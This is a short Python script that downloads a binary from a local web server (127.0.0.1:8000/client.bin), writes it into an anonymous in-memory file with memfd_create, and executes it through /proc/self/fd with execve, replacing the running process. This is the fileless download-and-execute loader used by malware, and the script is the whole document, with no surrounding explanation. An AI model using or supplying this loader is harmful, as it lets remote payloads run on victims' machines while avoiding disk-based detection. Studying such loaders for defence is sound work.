import os
import urllib.request

# Define the server URL
server_url = "http://127.0.0.1:8000/client.bin"

# Download the binary content from the URL
binary_content = urllib.request.urlopen(server_url).read()

# Create an anonymous file descriptor in memory
fd = os.memfd_create("client", flags=os.MFD_CLOEXEC)

# Write the binary content to the file descriptor
os.write(fd, binary_content)

# Execute the binary from memory, replacing the current process
os.execve("/proc/self/fd/{}".format(fd), ["client.bin"], os.environ)